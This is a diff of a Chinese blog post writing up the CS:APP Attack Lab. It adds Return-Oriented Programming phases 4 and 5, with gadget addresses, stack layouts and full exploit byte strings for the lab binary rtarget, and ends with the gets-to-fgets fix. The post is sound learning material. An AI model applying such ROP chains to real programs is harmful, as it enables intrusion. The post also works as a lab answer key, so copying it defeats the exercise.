@@ -106,7 +106,12 @@
 <meta property="og:image" content="http://o86az1gay.bkt.clouddn.com/phase2.png">
 <meta property="og:image" content="http://o86az1gay.bkt.clouddn.com/hexmatch.png">
 <meta property="og:image" content="http://o86az1gay.bkt.clouddn.com/phase3.png">
-<meta property="og:updated_time" content="2017-02-03T04:39:16.000Z">
+<meta property="og:image" content="http://o86az1gay.bkt.clouddn.com/rop.png">
+<meta property="og:image" content="http://o86az1gay.bkt.clouddn.com/addval_245.png">
+<meta property="og:image" content="http://o86az1gay.bkt.clouddn.com/setval_441.png">
+<meta property="og:image" content="http://o86az1gay.bkt.clouddn.com/phase4.png">
+<meta property="og:image" content="http://o86az1gay.bkt.clouddn.com/phase5.png">
+<meta property="og:updated_time" content="2017-02-03T12:02:20.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Buffer Overflow Attack">
 <meta name="twitter:description" content="2016Fall虽然只上了两门课，但是课程负担还是蛮大的，所以18600有一个仅当练习不计分数的Attack Lab一直没有时间做。要成为一名合格的白帽，技能树还是得点地全面一些。对于Attack Lab里的两种攻击方式，虽然为了准备Final已经了解了大概，但是纸上得来终觉浅，还是要亲自实战一番。
@@ -381,8 +386,38 @@
 <p><img src="http://o86az1gay.bkt.clouddn.com/hexmatch.png" alt="hexmatch"></p>
 <p>因此，写入攻击字符串后，getbuf函数返回后跳转到了0x55631248处执行指令，将cookie字符串地址0x55631255传入参数，将touch3的地址0x004018c0压栈，返回后跳转到touch3，成功验证。 </p>
 <p><img src="http://o86az1gay.bkt.clouddn.com/phase3.png" alt="phase3"></p>
-<h2 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return-Oriented Programming"></a>Return-Oriented Programming</h2><p>ROP部分一共有两个关卡，攻击目标都是一个叫做rtarget的可执行程序。</p>
-<h3 id="Phase4"><a href="#Phase4" class="headerlink" title="Phase4"></a>Phase4</h3><h3 id="Phase5"><a href="#Phase5" class="headerlink" title="Phase5"></a>Phase5</h3><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>要修补缓冲区溢出漏洞，只需要将gets函数替换为fgets函数，该函数能够规定每次读入的字符串长度，从而杜绝了溢出的可能。</p>
+<h2 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return-Oriented Programming"></a>Return-Oriented Programming</h2><p>为了防止代码注入，主要有以下几种方法：</p>
+<ul>
+<li>随机化栈地址，令攻击者无法确定注入代码的位置。</li>
+<li>设定栈中某些区域为“canary”，一旦代码注入攻击发生且修改了这些canary，系统就会及时发现。</li>
+<li>令栈不可执行，若强行更改返回地址并企图执行自定义指令，则系统会抛出Segmentation Fault异常。</li>
+</ul>
+<p>因此，与其注入新的代码，倒不如利用现成的代码，这种攻击技术成为Return-Oriented Programming(面向返回编程？)，简称ROP。现成的以RET（十六进制编码为0xc3）结尾的若干条指令称为一个gadget。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/rop.png" alt="rop"></p>
+<p>利用缓冲区溢出在栈上写入n个gadget的地址，首先控制跳转到第1个gadget的地址并开始执行，当遇到c3便返回，这时第2个gadget的地址作为返回地址，跳转后开始执行，以此类推。总的来说，ROP就是将散落在现存代码各处的许多包含c3的代码片段组织起来，以完成一系列连续的指令。</p>
+<p>ROP部分一共有两个关卡，攻击目标都是一个叫做rtarget的可执行程序，且gadget的函数名都在farm.c中可供查询。</p>
+<h3 id="Phase4"><a href="#Phase4" class="headerlink" title="Phase4"></a>Phase4</h3><p>第四关的要求和第二关一样，执行并成功验证touch2。但是如果尝试用代码注入的方法，会发现出现了Segmentation Fault，原因在于栈采用了随机化和不可执行的防御措施。因此，这里只能使用ROP的方式进行攻击，题目建议使用2个gadget。首先对rtarget进行反汇编。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump -d rtarget &gt; rtarget.txt</div></pre></td></tr></table></figure>
+<p>先尝试构造两条汇编语句完成参数的传入，其中cookie的值和touch2的地址可以和gadget的地址组合起来作为rtarget的输入字节。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POPQ %rax</div><div class="line">MOVQ %rax,%rdi</div></pre></td></tr></table></figure>
+<p>经过查表，<code>POPQ %rax</code>的指令编码为58，还需要加上RETQ的c3。在rtarget.txt中搜索到addval_245函数中有58 90 c3这样的片段，其中90是nop指令的编码，夹在中间没有影响。这个gadget的入口地址为0x00401973。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/addval_245.png" alt="addval_245"></p>
+<p>同理，<code>MOVQ %rax,%rdi</code>的指令编码为48 89 c7 c3，在setval_441中可以找到，入口地址为0x00401957。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/setval_441.png" alt="setval_441"></p>
+<p>因此，可以构造如下的栈结构。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">栈底</div><div class="line">0x004017ec // touch2</div><div class="line">0x00401957 // MOVQ %rax,%rdi</div><div class="line">0x2486651c // cookie</div><div class="line">0x00401973 // POPQ %rax</div><div class="line">栈顶</div></pre></td></tr></table></figure>
+<p>转化为字节，注意指令从0x55631280的返回地址开始覆盖以上栈结构。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 73 19 40 00</div><div class="line">00 00 00 00 1c 65 86 24 00 00</div><div class="line">00 00 57 19 40 00 00 00 00 00</div><div class="line">ec 17 40 00 00 00 00 00</div></pre></td></tr></table></figure>
+<p>当getbuf返回时，控制跳转到第一个gadget即POPQ函数处开始执行，随后cookie的值被POP进%rax中，遇到c3返回后又跳转到第二个gadget即MOVQ函数处开始执行，%rax的值被赋给了%rdi，又遇到c3返回后跳转到touch2函数并成功验证。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/phase4.png" alt="phase4"></p>
+<h3 id="Phase5"><a href="#Phase5" class="headerlink" title="Phase5"></a>Phase5</h3><p>第五关的要求和第三关一样，执行并成功验证touch3。题目建议可以使用8个gadget完成攻击。</p>
+<p>成功验证touch3需要传入存储cookie的首地址而不是cookie的值，但是栈的地址是随机产生的，就需要每次通过%rsp加上offset的方法来获得cookie的首地址。8个gadget的数据流比较复杂，因为没有直接定位cookie并赋值给%rdi的gadget，需要一步一步来构造。找gadget的流程和第四关类似，这里直接给出栈结构。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">栈底</div><div class="line">0x3234383636353163 // cookie</div><div class="line">0x004018c0 // touch3</div><div class="line">0x00401957 // MOVQ %rax,%rdi</div><div class="line">0x0040198c // LEA (%rdi,%rsi,1),%rax</div><div class="line">0x00401a2f // MOVL %edx,%esi</div><div class="line">0x004019eb // MOVL %ecx,%edx</div><div class="line">0x004019dd // MOVL %eax,%ecx</div><div class="line">0x48 // offset</div><div class="line">0x00401973 // POPQ %rax</div><div class="line">0x00401957 // MOVQ %rax,%rdi</div><div class="line">0x00401992 // MOVQ %rsp,%rax</div><div class="line">栈顶</div></pre></td></tr></table></figure>
+<p>转化为如下字节。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 92 19 40 00</div><div class="line">00 00 00 00 57 19 40 00 00 00</div><div class="line">00 00 73 19 40 00 00 00 00 00</div><div class="line">48 00 00 00 00 00 00 00 dd 19</div><div class="line">40 00 00 00 00 00 eb 19 40 00</div><div class="line">00 00 00 00 2f 1a 40 00 00 00</div><div class="line">00 00 8c 19 40 00 00 00 00 00</div><div class="line">57 19 40 00 00 00 00 00 c0 18</div><div class="line">40 00 00 00 00 00 32 34 38 36</div><div class="line">36 35 31 63</div></pre></td></tr></table></figure>
+<p>当getbuf返回时，当时的%rsp赋值给了%rdi，offset赋值给了%rsi，(%rsp+%rsi)就是cookie字符串的首地址，传入%rdi即可成功验证touch3。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/phase5.png" alt="phase5"></p>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>不论是代码注入，还是ROP，都是通过缓冲区溢出覆盖了原来getbuf的返回地址而完成攻击。要彻底修补该漏洞，只需要将gets函数替换为fgets函数，它能够规定每次读入的字符串长度，从而杜绝了溢出的可能。</p>
 
       
     </div>
